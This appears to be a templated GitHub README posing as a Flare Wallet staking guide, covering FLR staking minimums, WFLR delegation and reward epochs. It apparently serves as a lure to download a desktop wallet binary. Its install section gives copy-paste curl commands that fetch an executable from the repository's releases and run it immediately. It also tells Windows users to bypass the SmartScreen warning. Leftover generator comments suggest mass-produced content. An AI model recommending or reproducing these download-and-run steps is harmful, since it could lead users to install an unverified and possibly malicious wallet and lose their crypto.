![Flare Wallet](assets/banner-article.png)

# Flare Wallet Staking: Stake FLR and Delegate to FTSO Providers

Two different actions, two different minimums, and the lock that decides your timing.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

Staking and delegation are signed from the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02), which holds FLR and WFLR and connects to Flare mainnet.

> Staking locks funds for a minimum period. Decide the amount and the duration before you sign, because neither can be undone early.

Flare Wallet signs two distinct kinds of position: a P-Chain stake, which needs 50,000 FLR per validator and locks for at least 14 days, and FTSO delegation, which works on WFLR and pays awards in FLR. The wallet is the signer; the minimums, the epochs and the claim window are network rules that apply to every wallet on Flare.

<!-- ARTICLE-BODY-BEGIN -->

## Staking and delegating are not the same action

A stake locks FLR to a validator on the P-Chain for a fixed minimum period. Delegation points WFLR at an FTSO data provider and earns a share of what that provider is paid for producing accurate price data. One is a lock with a date; the other is an ongoing position you can change.

That distinction matters because most confusion comes from treating them as synonyms. A reader with 2,000 FLR cannot stake, because the validator minimum is far above it, but can still delegate if the tokens are wrapped. A reader with 60,000 FLR can do either, and should decide which before signing anything.

## The numbers that decide whether you can stake

| Rule | Value |
| --- | --- |
| Minimum stake per validator | 50,000 FLR |
| Minimum staking period | 14 days |
| Delegation token | WFLR, the wrapped form of FLR |
| FTSO providers per wallet | up to two |
| Reward epoch | 3.5 days |
| Claim window for delegation rewards | 90 days |

The 50,000 FLR figure is per validator, not per wallet, so it is the threshold that decides whether the staking route is open to you at all. Below it, delegation is the available action.

## Delegation: the part most people use

Delegation is where a normal balance does something. You wrap FLR into WFLR, choose an FTSO provider, and the position earns across 3.5-day epochs. Up to two providers can be selected from one wallet, which is the limit worth knowing before you split a balance.

Two timing rules shape the result. Rewards accrue per epoch, and unclaimed delegation rewards remain claimable for 90 days before the network stops allowing the claim. That window is a network rule, not a wallet setting, so no interface can extend it. How to collect is in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-claim-rewards.md">claim Flare Wallet rewards</a>, and the wrapping step itself is in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-wflr.md">Flare Wallet WFLR</a>.

## What the wallet does, and what the chain does

The wallet builds and signs the transaction. Everything that makes the position real happens on Flare: the P-Chain records the stake against a validator, and the FTSO records the delegation against a provider. That is why the explorer is the place to confirm a position, and why a wallet that looks wrong is usually a display problem rather than a lost stake.

Claiming is a transaction like any other, so it has to be signed by whichever interface you use; the wallet shows what it reads from the chain, and it does not hold your rewards. If a position does not appear at all, the first suspect is the network setting rather than the stake: <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-network-settings.md">Flare Wallet network settings</a> covers the chain ID a position has to be recorded on.

## Can you lose funds by staking?

The material risk is time, not the amount. A stake is locked for at least 14 days, so funds you may need sooner should not be staked. Rewards vary with what providers earn, and no page can promise a rate; anything quoting a fixed return is selling something.

What does not happen is a transfer of custody. Staking does not send your coins to a company, and the wallet still holds the key that controls the position. What changes is that the chain will not release the staked amount until the period ends.

## Unstaking and the 14-day lock

A stake cannot be withdrawn early. The minimum period is 14 days, and the unlock becomes possible once that period has passed, not on demand. Plan around the date rather than around an expectation of instant exit.

Delegation is more flexible in principle, because it is a pointer to a provider rather than a lock to a validator, but the reward accounting still runs on 3.5-day epochs. Moving a delegation mid-epoch does not retroactively change what was already earned.

## Staking XRP is a different question

XRP on the XRP Ledger is not staked, and Flare does not turn it into a staking asset. What exists on the Flare side is FXRP, XRP represented through FAssets, plus FLR and WFLR that can be staked or delegated. A page promising XRP staking is describing one of those, usually loosely.

## FAQ

### What is the minimum FLR staking amount?

50,000 FLR per validator, with a minimum period of 14 days. Delegation through WFLR is the route available below that threshold.

### How many FTSO providers can one wallet delegate to?

Up to two. Splitting across both is allowed, and the choice is worth making deliberately rather than defaulting to the first entry in a list.

### How long does unstaking take?

The stake is locked for at least 14 days, and it becomes withdrawable after that period rather than immediately. Delegation follows the 3.5-day reward epoch for accounting.

### Can I stake and delegate the same FLR?

Not the same coins at the same time: a stake locks native FLR on the P-Chain, while delegation works on WFLR, which requires wrapping. Decide the split before you commit either, because the staked part is locked.

### Can I lose my crypto if I stake it?

You keep custody; the lock is the constraint. The risks are the waiting period and variable rewards, not a transfer of ownership.

### Is staking my crypto worth it?

That depends on how much of your balance you can leave locked and for how long, which is a decision about your own liquidity rather than a rate anyone can quote for you. This page does not give investment advice.

### How do I delegate to an FTSO provider in Flare Wallet?

The wallet signs the delegation, and the position is recorded on Flare. Because the exact in-app labels depend on the build you installed, confirm the provider and the amount on screen, then confirm the result on the explorer rather than trusting the wallet's own display.

### Which wallet is best for staking?

One that holds both FLR and WFLR, signs locally and connects to Flare mainnet with the correct chain ID. This wallet meets those conditions; a machine you keep patched and a phrase you have written down matter more than the brand on the window. Install it from the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a> and confirm the tag before you fund anything.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive, so the install is extract-then-run rather than a single command. Verify the hash first.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[claim Flare Wallet rewards](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-claim-rewards.md) | [Flare Wallet WFLR](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-wflr.md) | [Flare Wallet Ledger](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-ledger.md) | [Flare Wallet network settings](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-network-settings.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
